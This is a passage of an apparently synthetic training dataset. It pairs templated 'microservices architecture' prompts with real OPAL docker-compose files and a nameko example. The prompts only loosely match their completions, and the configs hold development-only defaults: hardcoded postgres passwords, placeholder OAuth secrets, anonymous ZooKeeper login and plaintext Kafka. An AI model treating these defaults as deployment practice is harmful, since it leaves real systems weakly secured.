\"host.docker.internal:host-gateway\"\n    ports:\n      # exposes opal client on the host machine, you can access the client at: http://localhost:7001\n      - \"7001:7000\"\n      # exposes inline OPA on the host machine, you can access OPA at: http://localhost:8181\n      - \"8181:8181\"\n    depends_on:\n      - opal_server\n    # this command is not necessary when deploying OPAL for real, it is simply a trick for dev environments\n    # to make sure that opal-server is already up before starting the client.\n    command: sh -c \"exec ./wait-for.sh opal_server:7002 --timeout=20 -- ./start.sh\"\n\n# Note: OPA is now running inline within OPAL Client container with v0-compatibility\n  # No separate OPA container needed - OPAL Client handles OPA lifecycle\n\n  # Example External Data Provider - serves tenant-specific data\n  # Renamed from 'simple-api-provider' to follow OPAL naming conventions\n  # This nginx server provides mock tenant data endpoints for demonstration\n  example_external_data_provider:\n    image: nginx:alpine\n    ports:\n      # exposes the data provider on the host machine at: http://localhost:8090\n      - \"8090:80\"\n    volumes:\n      # Mount nginx configuration with inline JSON data (no external files needed)\n      - ./docker_files/example-external-data-provider/nginx.conf:/etc/nginx/nginx.conf:ro\n\n\n# Usage Instructions for Single Topic Multi-Tenant OPAL:\n#\n# 1. Navigate to docker directory and start all services:\n#    cd docker\n#    docker compose -f docker-compose-single-topic-multi-tenant.yml up -d\n#\n# 2. Wait for services to be ready (check health endpoints):\n#    curl http://localhost:7002/healthcheck   # OPAL Server\n#    curl http://localhost:8181/health        # OPA\n#    curl http://localhost:8090/acl/tenant1   # Data Provider\n#\n# 3. Add tenant1 data (initial tenant - no restart needed):\n#    curl -X POST http://localhost:7002/data/config \\\n#      -H \"Content-Type: application/json\" \\\n#      -d '{\n#        \"entries\": [{\n#          \"url\": \"http://example_external_data_provider:80/acl/tenant1\",\n#          \"topics\": [\"tenant_data\"],\n#          \"dst_path\": \"/acl/tenant1\"\n#        }],\n#        \"reason\": \"Load tenant1 data via single topic\"\n#      }'\n#\n# 4. Add tenant2 data (NO RESTART NEEDED! - This is the breakthrough):\n#    curl -X POST http://localhost:7002/data/config \\\n#      -H \"Content-Type: application/json\" \\\n#      -d '{\n#        \"entries\": [{\n#          \"url\": \"http://example_external_data_provider:80/acl/tenant2\",\n#          \"topics\": [\"tenant_data\"],\n#          \"dst_path\": \"/acl/tenant2\"\n#        }],\n#        \"reason\": \"Load tenant2 data via single topic - NO RESTART\"\n#      }'\n#\n# 5. Monitor logs to see real-time OPAL reactions (open separate terminals):\n#    # Watch OPAL Server logs (shows data config updates and broadcasting):\n#    docker compose -f docker-compose-single-topic-multi-tenant.yml logs -f opal_server\n#\n#    # Watch OPAL Client logs (shows data fetching and OPA updates):\n#    docker compose -f docker-compose-single-topic-multi-tenant.yml logs -f opal_client\n#\n#    # Key log messages you should see:\n#    # OPAL Server:\n#    # - \"Publishing data update to topics: {'tenant_data'}, reason: Load tenant1...\"\n#    # - \"Broadcasting incoming event: {'topic': 'tenant_data', 'notifier_id': ...}\"\n#    #\n#    # OPAL Client:\n#    # - \"Received notification of event: tenant_data\"\n#    # - \"Updating policy data, reason: Load tenant1 data via single topic\"\n#    # - \"Fetching data from url: http://example_external_data_provider:80/acl/tenant1\"\n#    # - \"Saving fetched data to policy-store: source url=..., destination path='/acl/tenant1'\"\n#\n# 6. Verify data isolation and tenant separation:\n#    curl -s http://localhost:8181/v1/data/acl/tenant1 | jq .\n#    curl -s http://localhost:8181/v1/data/acl/tenant2 | jq .\n#    curl -s http://localhost:8181/v1/data/acl | jq .\n#\n# 7. Test authorization policies with tenant context:\n#    curl -X POST http://localhost:8181/v1/data/policies/rbac/allow \\\n#      -H \"Content-Type: application/json\" \\\n#      -d '{\n#        \"input\": {\n#          \"user\": \"alice\",\n#          \"action\": \"read\",\n#          \"resource\": \"document1\",\n#          \"tenant_id\": \"tenant1\"\n#        }\n#      }' | jq .\n#\n# 8. LIVE DATA UPDATES - Update existing tenant data without restart:\n#    curl -X POST http://localhost:7002/data/config \\\n#      -H \"Content-Type: application/json\" \\\n#      -d '{\n#        \"entries\": [{\n#          \"url\": \"http://example_external_data_provider:80/acl/tenant1\",\n#          \"topics\": [\"tenant_data\"],\n#          \"dst_path\": \"/acl/tenant1\",\n#          \"config\": {\n#            \"tenant_id\": \"tenant1\",\n#            \"action\": \"update\",\n#            \"change_type\": \"live_refresh\",\n#            \"timestamp\": \"2025-01-18T12:00:00.000000\"\n#          }\n#        }],\n#        \"reason\": \"Live data refresh for tenant1 - demonstrating real-time updates\"\n#      }'\n#\n# 9. Monitor live update logs (same monitoring as step 5):\n#    # OPAL Server will show:\n#    # - \"Publishing data update to topics: {'tenant_data'}, reason: Live data refresh...\"\n#    #\n#    # OPAL Client will show:\n#    # - \"Received event on topic: tenant_data\"\n#    # - \"Fetching data from: http://example_external_data_provider:80/acl/tenant1\"\n#    # - \"processing store transaction: {'success': True, ...}\"\n#\n# 10. Verify live data synchronization:\n#     curl -s http://localhost:8181/v1/data/acl/tenant1 | jq .\n#\n# Key Benefits Demonstrated:\n# - ✅ Single topic 'tenant_data' handles unlimited tenants\n# - ✅ Zero downtime when adding new tenants\n# - ✅ Zero downtime when updating existing tenant data\n# - ✅ Real-time data synchronization across all tenants\n# - ✅ Perfect tenant isolation through OPA path hierarchy (/acl/tenant1, /acl/tenant2)\n# - ✅ Linear scalability: O(1) topics, O(N) tenants\n# - ✅ Simplified configuration management\n# - ✅ Real-time tenant provisioning\n#\n# Revolutionary Architecture:\n# Traditional: N tenants = N topics = restart required\n# Our approach: N tenants = 1 topic + N data sources = NO restart!\n#\n# Demo Architecture:\n# - Policies loaded from GitHub repo (demonstrates OPAL's designed workflow)\n# - All data served by local nginx container (no external APIs beyond repo)\n# - Reliable operation with standard OPAL policy sync mechanism\n", "metadata": {"source": "github.com/permitio/opal", "file_path": "docker/docker-compose-single-topic-multi-tenant.yml", "language": "yaml", "complexity": "complex", "star_count": 5318, "quality_score": 0.76, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 238}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: opal-callbacks-example\n\nservices:\n  # When scaling the opal-server to multiple nodes and/or multiple workers, we use\n  # a *broadcast* channel to sync between all the instances of opal-server.\n  # Under the hood, this channel is implemented by encode/broadcaster (see link below).\n  # At the moment, the broadcast channel can be either: postgresdb, redis or kafka.\n  # The format of the broadcaster URI string (the one we pass to opal server as `OPAL_BROADCAST_URI`) is specified here:\n  # https://github.com/encode/broadcaster#available-backends\n  broadcast_channel:\n    image: postgres:alpine\n    environment:\n      - POSTGRES_DB=postgres\n      - POSTGRES_USER=postgres\n      - POSTGRES_PASSWORD=postgres\n  opal_server:\n    # by default we run opal-server from latest official image\n    image: permitio/opal-server:latest\n    environment:\n      # the broadcast backbone uri used by opal server workers (see comments above for: broadcast_channel)\n      - OPAL_BROADCAST_URI=postgres://postgres:postgres@broadcast_channel:5432/postgres\n      # number of uvicorn workers to run inside the opal-server container\n      - UVICORN_NUM_WORKERS=4\n      # the git repo hosting our policy\n      # - if this repo is not public, you can pass an ssh key via `OPAL_POLICY_REPO_SSH_KEY`)\n      # - the repo we pass in this example is *public* and acts as an example repo with dummy rego policy\n      # - for more info, see: https://docs.opal.ac/tutorials/track_a_git_repo\n      - OPAL_POLICY_REPO_URL=https://github.com/permitio/opal-example-policy-repo\n      # in this example we will use a polling interval of 30 seconds to check for new policy updates (git commits affecting the rego policy).\n      # however, it is better to utilize a git *webhook* to trigger the server to check for changes only when the repo has new commits.\n      # for more info see: https://docs.opal.ac/tutorials/track_a_git_repo\n      - OPAL_POLICY_REPO_POLLING_INTERVAL=30\n      # configures from where the opal client should initially fetch data (when it first goes up, after disconnection, etc).\n      # the data sources represents from where the opal clients should get a \"complete picture\" of the data they need.\n      # after the initial sources are fetched, the client will subscribe only to update notifications sent by the server.\n      - OPAL_DATA_CONFIG_SOURCES={\"config\":{\"entries\":[{\"url\":\"http://opal_server:7002/policy-data\",\"topics\":[\"policy_data\"],\"dst_path\":\"/static\"}]}}\n      - OPAL_LOG_FORMAT_INCLUDE_PID=true\n    ports:\n      # exposes opal server on the host machine, you can access the server at: http://localhost:7002\n      - \"7002:7002\"\n    depends_on:\n      - broadcast_channel\n  opal_client:\n    # by default we run opal-client from latest official image\n    image: permitio/opal-client:latest\n    environment:\n      - OPAL_SERVER_URL=http://opal_server:7002\n      - OPAL_LOG_FORMAT_INCLUDE_PID=true\n      - OPAL_INLINE_OPA_LOG_FORMAT=http\n      # update callbacks config ----------------------------------\n      # this var turns on a callback (HTTP call to a configurable url) after every successful data update\n      # and allows you to track which data updates completed successfully and were saved to OPA cache.\n      - OPAL_SHOULD_REPORT_ON_DATA_UPDATES=True\n      # we configure a callback to go to a default location in the OPAL server, but you can configure\n      # a callback to any url you'd like. Each callback is either the url alone, or a tuple of\n      # (url, HttpFetcherConfig).\n      # We show here both ways to configure the same endpoint, one of them demonstrate how to\n      # add extra HTTP headers (the header shown is ignored, only here for example).\n      - OPAL_DEFAULT_UPDATE_CALLBACKS={\"callbacks\":[\"http://opal_server:7002/data/callback_report\"]}\n      # - OPAL_DEFAULT_UPDATE_CALLBACKS={\"callbacks\":[(\"http://opal_server:7002/data/callback_report\",{\"headers\":{\"X-My-Token\":\"token\"}})]}\n      # OPAL can load a special policy into OPA that acts as a healthcheck policy (Not directly related to the callback feature).\n      # This policy defines two opa rules you can query:\n      # ready rule (POST http://localhost:8181/data/system/opal/ready): signals that OPA is ready to accept authorization queries.\n      # healthy rule (POST http://localhost:8181/data/system/opal/ready): signals that the last policy and data updates succeeded.\n      - OPAL_OPA_HEALTH_CHECK_POLICY_ENABLED=True\n      # end of update callbacks config ---------------------------\n    ports:\n      # exposes opal client on the host machine, you can access the client at: http://localhost:7766\n      - \"7766:7000\"\n      # exposes the OPA agent (being run by OPAL) on the host machine\n      # you can access the OPA api that you know and love at: http://localhost:8181\n      # OPA api docs are at: https://www.openpolicyagent.org/docs/latest/rest-api/\n      - \"8181:8181\"\n    depends_on:\n      - opal_server\n    # this command is not necessary when deploying OPAL for real, it is simply a trick for dev environments\n    # to make sure that opal-server is already up before starting the client.\n    command: sh -c \"exec ./wait-for.sh opal_server:7002 --timeout=20 -- ./start.sh\"\n", "metadata": {"source": "github.com/permitio/opal", "file_path": "docker/docker-compose-with-callbacks.yml", "language": "yaml", "complexity": "simple", "star_count": 5318, "quality_score": 0.76, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 79}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: opal-kafka-example\n\nservices:\n  # Based on: https://developer.confluent.io/quickstart/kafka-docker/\n  zookeeper:\n    image: confluentinc/cp-zookeeper:6.2.0\n    hostname: zookeeper\n    ports:\n      - 2181:2181\n    environment:\n      - ZOOKEEPER_CLIENT_PORT=2181\n      - ZOOKEEPER_TICK_TIME=2000\n      - ALLOW_ANONYMOUS_LOGIN=yes\n\n  # When scaling the opal-server to multiple nodes and/or multiple workers, we use\n  # a *broadcast* channel to sync between all the instances of opal-server.\n  # Under the hood, this channel is implemented by encode/broadcaster (see link below).\n  # At the moment, the broadcast channel can be either: postgresdb, redis or kafka.\n  # The format of the broadcaster URI string (the one we pass to opal server as `OPAL_BROADCAST_URI`) is specified here:\n  # https://github.com/encode/broadcaster#available-backends\n  kafka_broadcast_channel:\n    image: confluentinc/cp-kafka:6.2.0\n    hostname: kafka\n    ports:\n      # To learn about configuring Kafka for access across networks see\n      # https://www.confluent.io/blog/kafka-client-cannot-connect-to-broker-on-aws-on-docker-etc/\n      - 9092:9092\n      - 29092:29092\n    depends_on:\n      - zookeeper\n    environment:\n      - KAFKA_BROKER_ID=1\n      - KAFKA_ZOOKEEPER_CONNECT=zookeeper:2181\n      - KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR=1\n      - KAFKA_LISTENER_SECURITY_PROTOCOL_MAP=PLAINTEXT:PLAINTEXT,PLAINTEXT_HOST:PLAINTEXT\n      - KAFKA_ADVERTISED_LISTENERS=PLAINTEXT_HOST://localhost:29092,PLAINTEXT://kafka:9092\n      - ALLOW_PLAINTEXT_LISTENER=yes\n      - KAFKA_TOPIC_AUTO_CREATE=true\n      - KAFKA_TRANSACTION_STATE_LOG_MIN_ISR=1\n      - KAFKA_TRANSACTION_STATE_LOG_REPLICATION_FACTOR=1\n\n  kafka-ui:\n    container_name: kafka-ui\n    image: provectuslabs/kafka-ui:latest\n    ports:\n      - 8080:8080\n    depends_on:\n      - kafka_broadcast_channel\n    environment:\n      KAFKA_CLUSTERS_0_BOOTSTRAPSERVERS: kafka:9092\n      # KAFKA_CLUSTERS_0_NAME: local\n  opal_server:\n    # build an image from the example Dockerfile in the current directory\n    # which uses the opal-server image from Docker Hub while adding the brodcaster Kafka module\n    image: permitio/opal-server:latest\n    environment:\n      # the broadcast backbone uri used by opal server workers (see comments above for: broadcast_channel)\n      - OPAL_BROADCAST_URI=kafka://kafka:9092\n      # number of uvicorn workers to run inside the opal-server container\n      - UVICORN_NUM_WORKERS=4\n      # the git repo hosting our policy\n      # - if this repo is not public, you can pass an ssh key via `OPAL_POLICY_REPO_SSH_KEY`)\n      # - the repo we pass in this example is *public* and acts as an example repo with dummy rego policy\n      # - for more info, see: https://docs.opal.ac/tutorials/track_a_git_repo\n      - OPAL_POLICY_REPO_URL=https://github.com/permitio/opal-example-policy-repo\n      # in this example we will use a polling interval of 30 seconds to check for new policy updates (git commits affecting the rego policy).\n      # however, it is better to utilize a git *webhook* to trigger the server to check for changes only when the repo has new commits.\n      # for more info see: https://docs.opal.ac/tutorials/track_a_git_repo\n      - OPAL_POLICY_REPO_POLLING_INTERVAL=30000\n      # configures from where the opal client should initially fetch data (when it first goes up, after disconnection, etc).\n      # the data sources represents from where the opal clients should get a \"complete picture\" of the data they need.\n      # after the initial sources are fetched, the client will subscribe only to update notifications sent by the server.\n      - OPAL_DATA_CONFIG_SOURCES={\"config\":{\"entries\":[{\"url\":\"http://opal_server:7002/policy-data\",\"topics\":[\"policy_data\"],\"dst_path\":\"/static\"}]}}\n      - OPAL_LOG_FORMAT_INCLUDE_PID=true\n    ports:\n      # exposes opal server on the host machine, you can access the server at: http://localhost:7002\n      - \"7002:7002\"\n    depends_on:\n      - kafka_broadcast_channel\n    command: sh -c \"exec /usr/wait-for.sh kafka:9092 --timeout=60 -- /start.sh\"\n\n  opal_client:\n    # by default we run opal-client from latest official image\n    image: permitio/opal-client:latest\n    environment:\n      - OPAL_SERVER_URL=http://opal_server:7002\n      - OPAL_LOG_FORMAT_INCLUDE_PID=true\n      - OPAL_INLINE_OPA_LOG_FORMAT=http\n    ports:\n      # exposes opal client on the host machine, you can access the client at: http://localhost:7766\n      - \"7766:7000\"\n      # exposes the OPA agent (being run by OPAL) on the host machine\n      # you can access the OPA api that you know and love at: http://localhost:8181\n      # OPA api docs are at: https://www.openpolicyagent.org/docs/latest/rest-api/\n      - \"8181:8181\"\n    depends_on:\n      - opal_server\n    # this command is not necessary when deploying OPAL for real, it is simply a trick for dev environments\n    # to make sure that opal-server is already up before starting the client.\n    command: sh -c \"exec /usr/wait-for.sh opal_server:7002 --timeout=20 -- /start.sh\"\n", "metadata": {"source": "github.com/permitio/opal", "file_path": "docker/docker-compose-with-kafka-example.yml", "language": "yaml", "complexity": "medium", "star_count": 5318, "quality_score": 0.76, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 101}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: opal-oauth-example\n\nservices:\n  # When scaling the opal-server to multiple nodes and/or multiple workers, we use\n  # a *broadcast* channel to sync between all the instances of opal-server.\n  # Under the hood, this channel is implemented by encode/broadcaster (see link below).\n  # At the moment, the broadcast channel can be either: postgresdb, redis or kafka.\n  # The format of the broadcaster URI string (the one we pass to opal server as `OPAL_BROADCAST_URI`) is specified here:\n  # https://github.com/encode/broadcaster#available-backends\n  broadcast_channel:\n    image: postgres:alpine\n    environment:\n      - POSTGRES_DB=postgres\n      - POSTGRES_USER=postgres\n      - POSTGRES_PASSWORD=postgres\n  opal_server:\n    # by default we run opal-server from latest official image\n    image: permitio/opal-server:latest\n    environment:\n      # the broadcast backbone uri used by opal server workers (see comments above for: broadcast_channel)\n      - OPAL_BROADCAST_URI=postgres://postgres:postgres@broadcast_channel:5432/postgres\n      # number of uvicorn workers to run inside the opal-server container\n      - UVICORN_NUM_WORKERS=4\n      # the git repo hosting our policy\n      # - if this repo is not public, you can pass an ssh key via `OPAL_POLICY_REPO_SSH_KEY`)\n      # - the repo we pass in this example is *public* and acts as an example repo with dummy rego policy\n      # - for more info, see: https://docs.opal.ac/tutorials/track_a_git_repo\n      - OPAL_POLICY_REPO_URL=https://github.com/permitio/opal-example-policy-repo\n      # in this example we will use a polling interval of 30 seconds to check for new policy updates (git commits affecting the rego policy).\n      # however, it is better to utilize a git *webhook* to trigger the server to check for changes only when the repo has new commits.\n      # for more info see: https://docs.opal.ac/tutorials/track_a_git_repo\n      - OPAL_POLICY_REPO_POLLING_INTERVAL=30\n      # configures from where the opal client should initially fetch data (when it first goes up, after disconnection, etc).\n      # the data sources represents from where the opal clients should get a \"complete picture\" of the data they need.\n      # after the initial sources are fetched, the client will subscribe only to update notifications sent by the server.\n      - OPAL_DATA_CONFIG_SOURCES={\"config\":{\"entries\":[{\"url\":\"http://opal_server:7002/policy-data\",\"topics\":[\"policy_data\"],\"dst_path\":\"/static\"}]}}\n      - OPAL_LOG_FORMAT_INCLUDE_PID=true\n    ports:\n      # exposes opal server on the host machine, you can access the server at: http://localhost:7002\n      - \"7002:7002\"\n    depends_on:\n      - broadcast_channel\n  opal_client:\n    # by default we run opal-client from latest official image\n    image: permitio/opal-client:latest\n    environment:\n      - OPAL_SERVER_URL=http://opal_server:7002\n      - OPAL_LOG_FORMAT_INCLUDE_PID=true\n      - OPAL_INLINE_OPA_LOG_FORMAT=http\n      - OPAL_POLICY_STORE_AUTH_TYPE=oauth\n      - OPAL_POLICY_STORE_AUTH_OAUTH_CLIENT_ID=some_client_id\n      - OPAL_POLICY_STORE_AUTH_OAUTH_CLIENT_SECRET=some_client_secret\n      - OPAL_POLICY_STORE_AUTH_OAUTH_SERVER=https://example/oauth2/token\n      # Enable Authorization / Authentication in OPA\n      - 'OPAL_INLINE_OPA_CONFIG={\"authentication\":\"token\", \"authorization\":\"basic\", \"files\": [\"authz.rego\"]}'\n    volumes:\n      # The goal is to create an initial authorization rego that allows OPAL to write the first policy from the POLICY_REPO_URL.\n      # This is achieved through policy overwrite based on the \"id\" attribute.\n      # When the authz.rego file is placed in the root directory of OPA, it is given the id 'authz.rego'.\n      # Similarly, if there is another authz.rego file in the root of POLICY_REPO_URL, it will also be given the id 'authz.rego'.\n      # Therefore, if the authz.rego file from the POLICY_REPO_URL exists, it will overwrite the initial authz.rego file.\n      - ./docker_files/policy_test/authz.rego:/opal/authz.rego\n    ports:\n      # exposes opal client on the host machine, you can access the client at: http://localhost:7766\n      - \"7766:7000\"\n      # exposes the OPA agent (being run by OPAL) on the host machine\n      # you can access the OPA api that you know and love at: http://localhost:8181\n      # OPA api docs are at: https://www.openpolicyagent.org/docs/latest/rest-api/\n      - \"8181:8181\"\n    depends_on:\n      - opal_server\n    # this command is not necessary when deploying OPAL for real, it is simply a trick for dev environments\n    # to make sure that opal-server is already up before starting the client.\n    command: sh -c \"exec ./wait-for.sh opal_server:7002 --timeout=20 -- ./start.sh\"\n", "metadata": {"source": "github.com/permitio/opal", "file_path": "docker/docker-compose-with-oauth-initial.yml", "language": "yaml", "complexity": "simple", "star_count": 5318, "quality_score": 0.76, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 75}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: opal-proxy-example\n\nnetworks:\n  server-network:\n    driver: bridge\n  client-network:\n    driver: bridge\n\nservices:\n  # Proxy server bridges between networks\n  proxy:\n    image: ubuntu/squid:latest\n    networks:\n      - server-network\n      - client-network\n    ports:\n      - \"3128:3128\"\n    volumes:\n      - ./docker_files/squid.conf:/etc/squid/squid.conf:ro\n\n\n  # PostgreSQL for OPAL Server broadcast channel\n  postgres:\n    image: postgres:alpine\n    networks:\n      - server-network\n    environment:\n      - POSTGRES_DB=postgres\n      - POSTGRES_USER=postgres\n      - POSTGRES_PASSWORD=postgres\n\n  # OPAL Server - only on server-network\n  opal_server:\n    image: permitio/opal-server:latest\n    networks:\n      - server-network\n    ports:\n      - \"7002:7002\"\n    environment:\n      - OPAL_BROADCAST_URI=postgres://postgres:postgres@postgres:5432/postgres\n      - OPAL_POLICY_REPO_URL=https://github.com/permitio/opal-example-policy-repo\n      - OPAL_POLICY_REPO_POLLING_INTERVAL=30\n      - OPAL_DATA_CONFIG_SOURCES={\"config\":{\"entries\":[{\"url\":\"http://opal_server:7002/policy-data\",\"topics\":[\"policy_data\"],\"dst_path\":\"/static\"}]}}\n    depends_on:\n      - postgres\n\n  # OPAL Client - on both networks, uses proxy for HTTP traffic\n  opal_client:\n    image: permitio/opal-client:latest\n    networks:\n      - client-network\n      - server-network\n    ports:\n      - \"7766:7000\"\n      - \"8181:8181\"\n    environment:\n      # Proxy configuration\n      - HTTP_PROXY=http://proxy:3128\n      - HTTPS_PROXY=http://proxy:3128\n      - ALL_PROXY=http://proxy:3128\n      - NO_PROXY=localhost,127.0.0.1,::1\n\n      # OPAL configuration\n      - OPAL_SERVER_URL=http://opal_server:7002\n      - OPAL_INLINE_OPA_ENABLED=true\n      - OPAL_LOG_FORMAT_INCLUDE_PID=true\n    command: sh -c \"exec ./start.sh\"\n    depends_on:\n      - opal_server\n      - proxy\n", "metadata": {"source": "github.com/permitio/opal", "file_path": "docker/docker-compose-with-proxy-example.yml", "language": "yaml", "complexity": "simple", "star_count": 5318, "quality_score": 0.73, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": true, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 71}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: opal-rate-limiting-example\n\n# This docker compose example shows how to configure OPAL's rate limiting feature\nservices:\n  # When scaling the opal-server to multiple nodes and/or multiple workers, we use\n  # a *broadcast* channel to sync between all the instances of opal-server.\n  # Under the hood, this channel is implemented by encode/broadcaster (see link below).\n  # At the moment, the broadcast channel can be either: postgresdb, redis or kafka.\n  # The format of the broadcaster URI string (the one we pass to opal server as `OPAL_BROADCAST_URI`) is specified here:\n  # https://github.com/encode/broadcaster#available-backends\n  broadcast_channel:\n    image: postgres:alpine\n    environment:\n      - POSTGRES_DB=postgres\n      - POSTGRES_USER=postgres\n      - POSTGRES_PASSWORD=postgres\n  opal_server:\n    # by default we run opal-server from latest official image\n    image: permitio/opal-server:next\n    environment:\n      # number of uvicorn workers to run inside the opal-server container\n      - UVICORN_NUM_WORKERS=1\n      # the git repo hosting our policy\n      # - if this repo is not public, you can pass an ssh key via `OPAL_POLICY_REPO_SSH_KEY`)\n      # - the repo we pass in this example is *public* and acts as an example repo with dummy rego policy\n      # - for more info, see: https://docs.opal.ac/tutorials/track_a_git_repo\n      - OPAL_POLICY_REPO_URL=https://github.com/permitio/opal-example-policy-repo\n      # in this example we will use a polling interval of 30 seconds to check for new policy updates (git commits affecting the rego policy).\n      # however, it is better to utilize a git *webhook* to trigger the server to check for changes only when the repo has new commits.\n      # for more info see: https://docs.opal.ac/tutorials/track_a_git_repo\n      - OPAL_POLICY_REPO_POLLING_INTERVAL=30\n      # configures from where the opal client should initially fetch data (when it first goes up, after disconnection, etc).\n      # the data sources represents from where the opal clients should get a \"complete picture\" of the data they need.\n      # after the initial sources are fetched, the client will subscribe only to update notifications sent by the server.\n      - OPAL_DATA_CONFIG_SOURCES={\"config\":{\"entries\":[{\"url\":\"http://opal_server:7002/policy-data\",\"topics\":[\"policy_data\"],\"dst_path\":\"/static\"}]}}\n      - OPAL_LOG_FORMAT_INCLUDE_PID=true\n      # Turns on rate limiting in the server\n      # supported formats documented here: https://limits.readthedocs.io/en/stable/quickstart.html#rate-limit-string-notation\n      - OPAL_CLIENT_LOAD_LIMIT_NOTATION=1/minute\n    ports:\n      # exposes opal server on the host machine, you can access the server at: http://localhost:7002\n      - \"7002:7002\"\n    depends_on:\n      - broadcast_channel\n  opal_client1:\n    # by default we run opal-client from latest official image\n    image: permitio/opal-client:next\n    environment:\n      - OPAL_SERVER_URL=http://opal_server:7002\n      - OPAL_LOG_FORMAT_INCLUDE_PID=true\n      - OPAL_INLINE_OPA_LOG_FORMAT=http\n      # Turns on rate limiting in the client (without this flag the client won't respect the server's rate limiting)\n      - OPAL_WAIT_ON_SERVER_LOAD=true\n    ports:\n      # exposes opal client on the host machine, you can access the client at: http://localhost:7003\n      - \"7003:7000\"\n      # exposes the OPA agent (being run by OPAL) on the host machine\n      # you can access the OPA api that you know and love at: http://localhost:8181\n      # OPA api docs are at: https://www.openpolicyagent.org/docs/latest/rest-api/\n      - \"8181:8181\"\n    depends_on:\n      - opal_server\n    # this command is not necessary when deploying OPAL for real, it is simply a trick for dev environments\n    # to make sure that opal-server is already up before starting the client.\n    command: sh -c \"exec ./wait-for.sh opal_server:7002 --timeout=20 -- ./start.sh\"\n  opal_client2:\n    # by default we run opal-client from latest official image\n    image: permitio/opal-client:next\n    environment:\n      - OPAL_SERVER_URL=http://opal_server:7002\n      - OPAL_LOG_FORMAT_INCLUDE_PID=true\n      - OPAL_INLINE_OPA_LOG_FORMAT=http\n      # Turns on rate limiting in the client (without this flag the client won't respect the server's rate limiting)\n      - OPAL_WAIT_ON_SERVER_LOAD=true\n    ports:\n      # exposes opal client on the host machine, you can access the client at: http://localhost:7004\n      - \"7004:7000\"\n      # exposes the OPA agent (being run by OPAL) on the host machine\n      # you can access the OPA api that you know and love at: http://localhost:8181\n      # OPA api docs are at: https://www.openpolicyagent.org/docs/latest/rest-api/\n      - \"8182:8181\"\n    depends_on:\n      - opal_server\n    # this command is not necessary when deploying OPAL for real, it is simply a trick for dev environments\n    # to make sure that opal-server is already up before starting the client.\n    command: sh -c \"exec ./wait-for.sh opal_server:7002 --timeout=20 -- ./start.sh\"\n", "metadata": {"source": "github.com/permitio/opal", "file_path": "docker/docker-compose-with-rate-limiting.yml", "language": "yaml", "complexity": "simple", "star_count": 5318, "quality_score": 0.76, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 87}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# advanced_http.py\n\nfrom nameko.web.handlers import http\nfrom werkzeug.wrappers import Response\n\nclass Service:\n    name = \"advanced_http_service\"\n\n    @http('GET', '/privileged')\n    def forbidden(self, request):\n        return 403, \"Forbidden\"\n\n    @http('GET', '/headers')\n    def redirect(self, request):\n        return 201, {'Location': 'https://www.example.com/widget/1'}, \"\"\n\n    @http('GET', '/custom')\n    def custom(self, request):\n        return Response(\"payload\")\n", "metadata": {"source": "github.com/nameko/nameko", "file_path": "docs/examples/advanced_http.py", "language": "python", "complexity": "simple", "star_count": 4742, "quality_score": 0.72, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 20}, "authority_level": "high", 